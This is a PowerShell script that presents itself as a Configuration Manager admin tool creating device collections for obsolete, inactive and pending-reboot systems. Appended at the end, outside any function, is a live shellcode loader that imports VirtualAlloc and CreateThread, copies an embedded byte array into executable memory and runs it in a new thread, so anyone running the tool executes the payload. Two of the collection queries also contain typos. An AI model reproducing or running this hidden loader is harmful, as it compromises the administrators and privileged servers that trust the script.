﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Name of the collection to be used as limiting collection for all maintenance collections")]
    [ValidateNotNullOrEmpty()]
    [string]$LimitingCollectionName,
    [parameter(Mandatory=$false, HelpMessage="Name of a Device Collections folder where the collections will be created. If not specified, the collections will be created in the root of Device Collections")]
    [ValidateNotNullOrEmpty()]
    [string]$FolderName
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Write-Warning -Message "Unable to determine SiteCode" ; break
    }
    
    if (-not(Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($LimitingCollectionName)'")) {
        Write-Warning -Message "Unable to determine the existence of a collection named '$($LimitingCollectionName)'" ; break
    }
}
Process {
    
    function New-ScheduleToken {
        param(
            [parameter(Mandatory=$false)]
            [int]$DayDuration = 0,
            [parameter(Mandatory=$false)]
            [int]$DaySpan = 0,
            [parameter(Mandatory=$false)]
            [int]$HourDuration = 0,
            [parameter(Mandatory=$false)]
            [int]$HourSpan = 0,
            [parameter(Mandatory=$false)]
            [bool]$IsGMT = $false,
            [parameter(Mandatory=$false)]
            [int]$MinuteDuration = 0,
            [parameter(Mandatory=$false)]
            [int]$MinuteSpan = 0,
            [parameter(Mandatory=$true)]
            [int]$StartTimeHour = 0,
            [parameter(Mandatory=$true)]
            [int]$StartTimeMin = 0,
            [parameter(Mandatory=$true)]
            [int]$StartTimeSec = 0
        )
        
        $StartTime = [System.Management.ManagementDateTimeconverter]::ToDMTFDateTime((Get-Date -Hour $StartTimeHour -Minute $StartTimeMin -Second $StartTimeSec))
        $ScheduleToken = ([WMIClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ST_RecurInterval").CreateInstance()
        $ScheduleToken.DayDuration = $DayDuration
        $ScheduleToken.DaySpan = $DaySpan
        $ScheduleToken.HourDuration = $HourDuration
        $ScheduleToken.HourSpan = $HourSpan
        $ScheduleToken.IsGMT = $IsGMT
        $ScheduleToken.MinuteDuration = $MinuteDuration
        $ScheduleToken.MinuteSpan = $MinuteSpan
        $ScheduleToken.StartTime = $StartTime
        return $ScheduleToken
    }

    function Get-LimitingCollectionID {
        param(
            [parameter(Mandatory=$true)]
            [string]$LimitingCollection
        )
        
        $LimitingCollectionID = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($LimitingCollectionName)'" | Select-Object -ExpandProperty CollectionID
        return $LimitingCollectionID
    }

    function Create-Collection {
        param(
            [parameter(Mandatory=$true)]
            [string]$CollectionName,
            [parameter(Mandatory=$true)]
            [string]$CollectionQuery,
            [parameter(Mandatory=$true)]
            [string]$QueryRuleName
        )
        
        $ValidateQuery = Invoke-WmiMethod -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_CollectionRuleQuery -Name ValidateQuery -ArgumentList $CollectionQuery -ComputerName $SiteServer
        
        if ($ValidateQuery) {
            $NewRule = ([WMIClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_CollectionRuleQuery").CreateInstance()
            $NewRule.QueryExpression = $CollectionQuery
            $NewRule.RuleName = $QueryRuleName
            
            Write-Verbose -Message "Creating collection: $($CollectionName)"
            $NewDeviceCollection = ([WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_Collection").CreateInstance()
            $NewDeviceCollection.Name = $CollectionName
            $NewDeviceCollection.OwnedByThisSite = $true
            $NewDeviceCollection.CollectionRules += $NewRule
            $NewDeviceCollection.LimitToCollectionID = (Get-LimitingCollectionID -LimitingCollection $LimitingCollectionName)
            $NewDeviceCollection.RefreshSchedule = (New-ScheduleToken -HourSpan 12 -StartTimeHour 7 -StartTimeMin 0 -StartTimeSec 0)
            $NewDeviceCollection.RefreshType = 2
            $NewDeviceCollection.CollectionType = 2
            $NewDeviceCollection.Put() | Out-Null
            
            if ((Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($CollectionName)'" | Measure-Object).Count -eq 1) {
                Write-Verbose -Message "Successfully created collection '$($CollectionName)'"
            }
            else {
                Write-Warning -Message "Unable to create collection '$($CollectionName)'"
            }
            
            if ($Script:PSBoundParameters["FolderName"]) {
                $CollectionID = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($CollectionName)' AND CollectionType = 2" | Select-Object -ExpandProperty CollectionID
                [int]$TargetFolder = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ObjectContainerNode -ComputerName $SiteServer -Filter "ObjectType = 5000 AND Name like '$($FolderName)'" | Select-Object -ExpandProperty ContainerNodeID
                [int]$SourceFolder = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ObjectContainerItem -ComputerName $SiteServer -Filter "InstanceKey like '$($CollectionID)'" | Select-Object -ExpandProperty ContainerNodeID
                $Parameters = ([WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ObjectContainerItem").GetMethodParameters("MoveMembers")
                $Parameters.ObjectType = 5000
                $Parameters.ContainerNodeID = $SourceFolder
                $Parameters.TargetContainerNodeID = $TargetFolder
                $Parameters.InstanceKeys = $CollectionID
                $MoveCollectionToFolder = ([WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ObjectContainerItem").InvokeMethod("MoveMembers", $Parameters, $null)
                if ($MoveCollectionToFolder.ReturnValue -eq 0) {
                    Write-Verbose -Message "Successfully moved collection '$($CollectionName)' to the '$($FolderName)' folder"
                }
            }
            
            $NewDeviceCollection.RequestRefresh() | Out-Null
        }
    }

    
    $CollectionsTable = @{
        "All Obsolete Systems" = 'select SMS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System where SMS_R_System.Obsolete = "1"'
        "All Inactive Systems" = 'select SMS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System inner join SMS_G_System_CH_ClientSummary on SMS_G_System_CH_ClientSummary.ResourceId = SMS_R_System.ResourceId where SMS_G_System_CH_ClientSummary.ClientActiveStatus = 0'
        "All Active Systems" = 'select SMS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System inner join SMS_G_System_CH_ClientSummary on SMS_G_System_CH_ClientSummary.ResourceID = SMS_R_System.ResourceId where SMS_G_System_CH_ClientSummary.ClientActiveStatus = 1 and SMS_R_System.Client is not null'
        "All Systems with a ConfigMgr Client" = 'select MS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System where SMS_R_System.Client is not NULL'
        "All Systems without a ConfigMgr Client" = 'select SMS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System where SMS_R_System.Client is null'
        "All Systems with Pending Reboot" = 'select SMS_R_SYSTEM.ResourceID, SMS_R_SYSTEM.ResourceType, SMS_R_SYSTEM.Name, SMS_R_SYSTEM.SMSUniqueIdentifier, SMS_R_SYSTEM.ResourceDomainORWorkgroup, SMS_R_SYSTEM.Client FROM sms_r_system inner join SMS_UpdateComplianceStatus ON SMS_UpdateComplianceStatus.MachineId = SMS_R_System.ResourceId WHERE SMS_UpdateComplianceStatus.LastEnforcementMessageID = 9'
        "All Servers not rebooted in the last 30 days" = 'select SMS_R_SYSTEM.ResourceID, SMS_R_SYSTEM.ResourceType, SMS_R_SYSTEM.Name, SMS_R_SYSTEM.SMSUniqueIdentifier, SMS_R_SYSTEM.ResourceDomainORWorkgroup, SMS_R_SYSTEM.Client from SMS_R_System INNER JOIN SMS_G_System_OPERATING_SYSTEM ON SMS_G_System_OPERATING_SYSTEM.ResourceID = SMS_R_System.ResourceId WHERE (SMS_G_System_OPERATING_SYSTEM.Caption like "%2003%" or SMS_G_System_OPERATING_SYSTEM.Caption like "%2008%") or SMS_G_System_OPERATING_SYSTEM.Caption like "%2012%") and (DateDiff(day, SMS_G_System_OPERATING_SYSTEM.LastBootUpTime, GetDate()) >30)'
    }
    foreach ($Collection in $CollectionsTable.Keys) {
        Create-Collection -CollectionName $Collection -CollectionQuery $CollectionsTable["$Collection"] -QueryRuleName $Collection
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc3,0x57,0xdd,0x65,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x13,0x03,0x45,0x13,0x83,0xc5,0xc7,0xb5,0x28,0x99,0x2f,0xbb,0xd3,0x62,0xaf,0xdc,0x5a,0x87,0x9e,0xdc,0x39,0xc3,0xb0,0xec,0x4a,0x81,0x3c,0x86,0x1f,0x32,0xb7,0xea,0xb7,0x35,0x70,0x40,0xee,0x78,0x81,0xf9,0xd2,0x1b,0x01,0x00,0x07,0xfc,0x38,0xcb,0x5a,0xfd,0x7d,0x36,0x96,0xaf,0xd6,0x3c,0x05,0x40,0x53,0x08,0x96,0xeb,0x2f,0x9c,0x9e,0x08,0xe7,0x9f,0x8f,0x9e,0x7c,0xc6,0x0f,0x20,0x51,0x72,0x06,0x3a,0xb6,0xbf,0xd0,0xb1,0x0c,0x4b,0xe3,0x13,0x5d,0xb4,0x48,0x5a,0x52,0x47,0x90,0x9a,0x54,0xb8,0xe7,0xd2,0xa7,0x45,0xf0,0x20,0xda,0x91,0x75,0xb3,0x7c,0x51,0x2d,0x1f,0x7d,0xb6,0xa8,0xd4,0x71,0x73,0xbe,0xb3,0x95,0x82,0x13,0xc8,0xa1,0x0f,0x92,0x1f,0x20,0x4b,0xb1,0xbb,0x69,0x0f,0xd8,0x9a,0xd7,0xfe,0xe5,0xfd,0xb8,0x5f,0x40,0x75,0x54,0x8b,0xf9,0xd4,0x30,0x78,0x30,0xe7,0xc0,0x16,0x43,0x94,0xf2,0xb9,0xff,0x32,0xbe,0x32,0x26,0xc4,0xc1,0x68,0x9e,0x5a,0x3c,0x93,0xdf,0x73,0xfa,0xc7,0x8f,0xeb,0x2b,0x68,0x44,0xec,0xd4,0xbd,0xf1,0xe9,0x42,0xfe,0xae,0xf2,0x99,0x96,0xac,0xf2,0x82,0xf6,0x38,0x14,0xec,0xa6,0x6a,0x89,0x4c,0x17,0xcb,0x79,0x24,0x7d,0xc4,0xa6,0x54,0x7e,0x0e,0xcf,0xfe,0x91,0xe7,0xa7,0x96,0x08,0xa2,0x3c,0x07,0xd4,0x78,0x39,0x07,0x5e,0x8f,0xbd,0xc9,0x97,0xfa,0xad,0xbd,0x57,0xb1,0x8c,0x6b,0x67,0x6f,0xba,0x93,0xfd,0x94,0x6d,0xc4,0x69,0x97,0x48,0x22,0x36,0x68,0xbf,0x39,0xff,0xfc,0x00,0x55,0x00,0x11,0x81,0xa5,0x56,0x7b,0x81,0xcd,0x0e,0xdf,0xd2,0xe8,0x50,0xca,0x46,0xa1,0xc4,0xf5,0x3e,0x16,0x4e,0x9e,0xbc,0x41,0xb8,0x01,0x3e,0xa4,0x38,0x7d,0xe9,0x80,0x4e,0x6f,0x29;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

